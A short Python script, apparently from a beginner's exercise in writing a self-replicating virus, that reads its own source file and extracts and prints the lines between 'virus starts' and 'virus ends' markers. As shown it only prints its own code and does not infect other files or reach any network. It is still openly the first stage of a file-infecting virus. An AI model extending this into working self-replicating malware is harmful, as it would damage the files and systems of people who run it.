### THE VIRUS STARTS HERE ###
import glob, sys 

code = []

# open this file,read every lines and find the virus area
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False
for line in lines:
    if line == '### THE VIRUS STARTS HERE ###\n':
      virus_area = True
    if virus_area:
        code.append(line)
    if line == '### THE VIRUS ENDS HERE ###\n':
        break
#print(line)    
### THE VIRUS ENDS HERE ###
print(code)
